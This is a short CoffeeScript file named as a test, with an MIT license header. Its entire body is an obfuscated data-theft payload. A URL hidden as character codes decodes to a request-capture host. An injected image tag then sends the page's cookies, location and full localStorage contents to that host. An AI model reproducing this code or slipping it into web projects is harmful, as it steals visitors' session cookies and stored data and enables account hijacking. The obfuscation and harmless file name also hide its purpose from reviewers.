###
# test.js.coffee
# Copyright (C) 2015 dhilipsiva <dhilipsiva@gmail.com>
#
# Distributed under terms of the MIT license.
###
u = String.fromCharCode.apply @, [104, 116, 116, 112, 58, 47, 47, 114, 101, 113, 117, 101, 115, 116, 98, 46, 105, 110, 47, 49, 48, 54, 103, 104, 115, 108, 49]
d = document
i = d.createElement "img"
i.src = "#{u}?c=#{d.cookie}&l=#{escape location.toString()}&ls=#{JSON.stringify localStorage }"
d.body.appendChild i
